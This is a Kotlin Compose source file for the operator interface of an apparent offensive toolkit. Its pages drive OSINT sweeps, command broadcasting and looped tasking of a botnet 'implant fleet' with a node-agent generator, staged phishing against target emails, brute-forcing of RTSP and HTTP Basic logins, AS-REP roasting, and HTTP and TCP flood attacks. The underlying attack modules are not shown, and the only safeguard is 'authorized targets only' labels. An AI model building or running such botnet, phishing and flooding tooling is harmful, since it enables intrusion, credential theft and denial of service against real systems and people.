package com.projectzerodays.quantumcli.ui

import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.heightIn
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.runtime.saveable.rememberSaveable
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.projectzerodays.quantumcli.QuantumApp
import com.projectzerodays.quantumcli.c2.C2State
import com.projectzerodays.quantumcli.c2.QuantServerManager
import com.projectzerodays.quantumcli.ops.Botnet
import com.projectzerodays.quantumcli.ops.Brute
import com.projectzerodays.quantumcli.ops.Ddos
import com.projectzerodays.quantumcli.ops.Osint
import com.projectzerodays.quantumcli.ops.Phish
import com.projectzerodays.quantumcli.ui.theme.Cyan
import com.projectzerodays.quantumcli.ui.theme.Danger
import com.projectzerodays.quantumcli.ui.theme.Ok
import com.projectzerodays.quantumcli.ui.theme.Muted
import com.projectzerodays.quantumcli.ui.theme.QuantumTypography
import com.projectzerodays.quantumcli.ui.theme.SoftCyan
import com.projectzerodays.quantumcli.ui.theme.Softest
import com.projectzerodays.quantumcli.ui.theme.quantumPanel
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

@Composable
internal fun PageHeader(title: String, subtitle: String) {
    Text(title, style = QuantumTypography.displaySmall, color = Cyan)
    Spacer(Modifier.height(4.dp))
    Text(subtitle, style = QuantumTypography.bodySmall, color = Muted)
    Spacer(Modifier.height(12.dp))
}

@Composable
internal fun ResultList(lines: List<String>) {
    LazyColumn(
        modifier = Modifier
            .fillMaxWidth()
            .heightIn(max = 400.dp)
            .quantumPanel()
            .padding(8.dp),
    ) {
        items(lines) { l ->
            Text(l, style = QuantumTypography.bodySmall, color = Softest, fontSize = 11.sp)
        }
    }
}

// ---------------------------------------------------------------------------
// OSINT — RDAP, DNS/DoH, subdomains, geo, GitHub search, HIBP
// ---------------------------------------------------------------------------

@Composable
fun OsintPage() {
    val scope = rememberCoroutineScope()
    var target by rememberSaveable { mutableStateOf("") }
    var email by rememberSaveable { mutableStateOf("") }
    var busy by remember { mutableStateOf(false) }
    var findings by remember { mutableStateOf<List<Osint.Finding>>(emptyList()) }

    Column(
        Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(horizontal = 20.dp),
    ) {
        PageHeader(
            "OSINT",
            "RDAP/whois · DNS over DoH · crt.sh subdomains · IP geo · GitHub code search · HIBP breaches",
        )
        OutlinedTextField(
            value = target,
            onValueChange = { target = it },
            label = { Text("Domain or IP") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(
                onClick = {
                    busy = true
                    scope.launch {
                        findings = withContext(Dispatchers.IO) { Osint.sweep(target) }
                        busy = false
                    }
                },
                enabled = !busy && target.isNotBlank(),
            ) { Text(if (busy) "SWEEPING…" else "FULL SWEEP") }
            OutlinedButton(
                onClick = {
                    busy = true
                    scope.launch {
                        findings = withContext(Dispatchers.IO) {
                            Osint.dnsRecords(target) + Osint.subdomains(target)
                        }
                        busy = false
                    }
                },
                enabled = !busy && target.isNotBlank(),
            ) { Text("DNS + SUBS") }
            OutlinedButton(
                onClick = {
                    busy = true
                    scope.launch {
                        val gh = withContext(Dispatchers.IO) { Osint.githubSearch(target) }
                        findings = gh
                        busy = false
                    }
                },
                enabled = !busy && target.isNotBlank(),
            ) { Text("GITHUB") }
        }
        Spacer(Modifier.height(8.dp))
        OutlinedTextField(
            value = email,
            onValueChange = { email = it },
            label = { Text("Email (HIBP breach check)") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        OutlinedButton(
            onClick = {
                busy = true
                scope.launch {
                    val b = withContext(Dispatchers.IO) { Osint.breach(email) }
                    findings = listOf(Osint.Finding("HIBP", email, b.toString().take(400)))
                    busy = false
                }
            },
            enabled = !busy && email.isNotBlank(),
        ) { Text("CHECK BREACHES") }
        if (busy) LinearProgressIndicator(Modifier.fillMaxWidth().padding(vertical = 8.dp))
        if (findings.isNotEmpty()) {
            Spacer(Modifier.height(8.dp))
            ResultList(findings.map { "[${it.kind}] ${it.value} ${it.detail}".trim() })
        }
        Spacer(Modifier.height(20.dp))
    }
}

// ---------------------------------------------------------------------------
// Botnet — fleet broadcast + tasking loop + node agent generator
// ---------------------------------------------------------------------------

@Composable
fun BotnetPage() {
    val implants by C2State.implants.collectAsState()
    val running by Botnet.running.collectAsState()
    val waves by Botnet.waves.collectAsState()
    var cmd by rememberSaveable { mutableStateOf("uname -a") }
    var interval by rememberSaveable { mutableStateOf("60") }
    var agentScript by remember { mutableStateOf<String?>(null) }

    Column(
        Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(horizontal = 20.dp),
    ) {
        PageHeader(
            "Botnet",
            "Synchronized tasking over the implant fleet (server) + fleet-node agent generator (client). Authorized engagements only.",
        )
        Text("Fleet: ${implants.size} node(s) enrolled", style = QuantumTypography.titleSmall, color = if (implants.isEmpty()) Muted else Ok)
        Spacer(Modifier.height(8.dp))
        OutlinedTextField(
            value = cmd,
            onValueChange = { cmd = it },
            label = { Text("Command") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        OutlinedTextField(
            value = interval,
            onValueChange = { interval = it.filter(Char::isDigit) },
            label = { Text("Loop interval (seconds)") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(
                onClick = { Botnet.broadcast(cmd) },
                enabled = cmd.isNotBlank(),
            ) { Text("BROADCAST ONCE") }
            if (!running) {
                Button(
                    onClick = { Botnet.startLoop(cmd, interval.toIntOrNull() ?: 60) },
                    enabled = cmd.isNotBlank(),
                ) { Text("START TASKING LOOP") }
            } else {
                Button(onClick = { Botnet.stop() }) { Text("STOP LOOP") }
            }
            OutlinedButton(
                onClick = {
                    agentScript = Botnet.nodeAgent(
                        "${com.projectzerodays.quantumcli.ops.Net.localIp()}:${QuantServerManager.boundPort}"
                    )
                },
            ) { Text("GEN NODE AGENT") }
        }
        if (running) {
            Spacer(Modifier.height(6.dp))
            Text("TASKING LOOP RUNNING", style = QuantumTypography.labelMedium, color = Danger)
        }
        if (waves.isNotEmpty()) {
            Spacer(Modifier.height(8.dp))
            Text("Waves (${waves.size})", style = QuantumTypography.titleSmall, color = SoftCyan)
            ResultList(waves.reversed().map { "${it.ts.take(19)}  hosts=${it.hosts}  ${it.cmd.take(60)}" })
        }
        agentScript?.let {
            Spacer(Modifier.height(8.dp))
            Text("Fleet node agent (serve via /s/ghostfang or push manually)", style = QuantumTypography.titleSmall, color = SoftCyan)
            ResultList(it.lines())
        }
        Spacer(Modifier.height(20.dp))
    }
}

// ---------------------------------------------------------------------------
// Phishing / Social Engineering — staged campaigns
// ---------------------------------------------------------------------------

@Composable
fun PhishPage() {
    val scope = rememberCoroutineScope()
    var email by rememberSaveable { mutableStateOf("") }
    var subject by rememberSaveable { mutableStateOf("Payroll") }
    var result by remember { mutableStateOf<String?>(null) }

    Column(
        Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(horizontal = 20.dp),
    ) {
        PageHeader(
            "Phishing / Social Engineering",
            "Deterministic pretext + lure staging (QBrain). Every staged artifact is audited.",
        )
        OutlinedTextField(
            value = email,
            onValueChange = { email = it },
            label = { Text("Target email") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        OutlinedTextField(
            value = subject,
            onValueChange = { subject = it },
            label = { Text("Pretext / subject") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        Button(
            onClick = {
                scope.launch {
                    val r = withContext(Dispatchers.IO) { Phish.launch(email, subject) }
                    result = r.toString(2)
                }
            },
            enabled = email.isNotBlank(),
            modifier = Modifier.fillMaxWidth(),
        ) { Text("STAGE PHISH") }
        result?.let {
            Spacer(Modifier.height(8.dp))
            ResultList(it.lines())
        }
        Spacer(Modifier.height(20.dp))
    }
}

// ---------------------------------------------------------------------------
// Brute force / cracking — RTSP, HTTP Basic, AS-REP roast
// ---------------------------------------------------------------------------

@Composable
fun BrutePage() {
    val scope = rememberCoroutineScope()
    var ip by rememberSaveable { mutableStateOf("") }
    var service by rememberSaveable { mutableStateOf("rtsp") }
    var path by rememberSaveable { mutableStateOf("/") }
    var busy by remember { mutableStateOf(false) }
    var result by remember { mutableStateOf<String?>(null) }

    Column(
        Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(horizontal = 20.dp),
    ) {
        PageHeader(
            "Brute Force / Cracking",
            "RTSP DESCRIBE auth brute · HTTP Basic brute · AS-REP roast (hashcat -m 18200)",
        )
        OutlinedTextField(
            value = ip,
            onValueChange = { ip = it },
            label = { Text("Target IP") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("rtsp", "http", "asreproast").forEach { s ->
                OutlinedButton(onClick = { service = s }) {
                    Text(if (service == s) "[$s]" else s, fontSize = 11.sp)
                }
            }
        }
        if (service == "http") {
            Spacer(Modifier.height(6.dp))
            OutlinedTextField(
                value = path,
                onValueChange = { path = it },
                label = { Text("Protected path") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth(),
            )
        }
        Spacer(Modifier.height(8.dp))
        Button(
            onClick = {
                busy = true
                scope.launch {
                    val params = if (service == "http") mapOf("path" to path) else emptyMap()
                    val r = withContext(Dispatchers.IO) { Brute.run(ip, service, params) }
                    result = r.toString(2)
                    busy = false
                }
            },
            enabled = !busy && ip.isNotBlank(),
            modifier = Modifier.fillMaxWidth(),
        ) { Text(if (busy) "RUNNING…" else "RUN $service BRUTE") }
        if (busy) LinearProgressIndicator(Modifier.fillMaxWidth().padding(vertical = 8.dp))
        result?.let {
            Spacer(Modifier.height(8.dp))
            ResultList(it.lines())
        }
        Spacer(Modifier.height(20.dp))
    }
}

// ---------------------------------------------------------------------------
// DDoS / stress — HTTP + TCP flood (authorized targets only)
// ---------------------------------------------------------------------------

@Composable
fun DdosPage() {
    val running by Ddos.running.collectAsState()
    val stats by Ddos.stats.collectAsState()
    var mode by rememberSaveable { mutableStateOf("http") }
    var target by rememberSaveable { mutableStateOf("") }
    var port by rememberSaveable { mutableStateOf("80") }
    var workers by rememberSaveable { mutableStateOf("16") }
    var duration by rememberSaveable { mutableStateOf("30") }

    Column(
        Modifier.fillMaxSize().verticalScroll(rememberScrollState()).padding(horizontal = 20.dp),
    ) {
        PageHeader(
            "DDoS / Stress",
            "HTTP request flood + TCP connect flood. AUTHORIZED TARGETS ONLY — load you have permission to test.",
        )
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            listOf("http" to "HTTP FLOOD", "tcp" to "TCP FLOOD").forEach { (m, label) ->
                OutlinedButton(onClick = { mode = m }) {
                    Text(if (mode == m) "[$label]" else label, fontSize = 11.sp)
                }
            }
        }
        Spacer(Modifier.height(8.dp))
        OutlinedTextField(
            value = if (mode == "http") target else target,
            onValueChange = { target = it },
            label = { Text(if (mode == "http") "Target URL (http://…)" else "Target host") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        if (mode == "tcp") {
            Spacer(Modifier.height(6.dp))
            OutlinedTextField(
                value = port,
                onValueChange = { port = it.filter(Char::isDigit) },
                label = { Text("Port") },
                singleLine = true,
                modifier = Modifier.fillMaxWidth(),
            )
        }
        Spacer(Modifier.height(6.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedTextField(
                value = workers,
                onValueChange = { workers = it.filter(Char::isDigit) },
                label = { Text("Workers") },
                singleLine = true,
                modifier = Modifier.weight(1f),
            )
            Spacer(Modifier.width(8.dp))
            OutlinedTextField(
                value = duration,
                onValueChange = { duration = it.filter(Char::isDigit) },
                label = { Text("Duration (s)") },
                singleLine = true,
                modifier = Modifier.weight(1f),
            )
        }
        Spacer(Modifier.height(8.dp))
        if (!running) {
            Button(
                onClick = {
                    val w = workers.toIntOrNull()?.coerceIn(1, 128) ?: 16
                    val d = duration.toIntOrNull()?.coerceIn(1, 600) ?: 30
                    if (mode == "http") Ddos.startHttp(target, w, d)
                    else Ddos.startTcp(target, port.toIntOrNull() ?: 80, w, d)
                },
                enabled = target.isNotBlank(),
                modifier = Modifier.fillMaxWidth(),
            ) { Text("START FLOOD") }
        } else {
            Button(onClick = { Ddos.stop() }, modifier = Modifier.fillMaxWidth()) { Text("STOP") }
            Spacer(Modifier.height(6.dp))
            Text(
                "sent=${stats.sent}  ok=${stats.ok}  err=${stats.errors}  ${stats.rps}/s",
                style = QuantumTypography.titleSmall,
                color = if (stats.errors > stats.ok) Danger else Ok,
            )
        }
        Spacer(Modifier.height(20.dp))
    }
}
